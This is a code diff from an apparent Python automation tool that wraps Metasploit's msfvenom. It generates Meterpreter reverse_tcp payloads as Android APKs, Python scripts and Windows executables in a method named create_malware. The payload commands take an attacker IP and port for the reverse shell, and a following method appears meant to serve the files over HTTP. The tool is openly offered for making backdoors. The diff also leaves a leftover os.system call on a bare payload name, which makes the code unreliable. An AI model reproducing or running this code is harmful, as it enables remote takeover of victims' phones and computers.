@@ -10,11 +10,14 @@ class msfauto_ultra():
         self.port1 = port_one
         self.port2 = port_two
         self.payload = payload
-        if self.payload == "android": self.payload = f"msfvenom -p android/meterpreter/reverse_tcp -f apk > /Output/{self.app_name}.apk"
-        elif self.payload == "mac": self.payload = f"msfvenom -p python/meterpreter/reverse_tcp > /Output/{self.app_name}.py"
-        else: self.payload = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={self.ip} LPORT={self.port1} -f exe > Output/{self.app_name}.exe"
+        if self.payload == "android": self.payload = "android/meterpreter/reverse_tcp"
+        elif self.payload == "mac": self.payload = "python/meterpreter/reverse_tcp"
+        else: self.payload = "windows/meterpreter/reverse_tcp"
     def create_malware(self): 
         create_output_folder()
+        if self.payload == "android/meterpreter/reverse_tcp": os.system(f"msfvenom -p android/meterpreter/reverse_tcp -f apk > /Output/{self.app_name}.apk")
+        elif self.payload == "python/meterpreter/reverse_tcp": os.system(f"msfvenom -p python/meterpreter/reverse_tcp > /Output/{self.app_name}.py")
+        else: os.system(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={self.ip} LPORT={self.port1} -f exe > Output/{self.app_name}.exe")
         os.system(self.payload)
         print(Fore.GREEN + "Malware created. continue...")
     def craete_http_server(self):
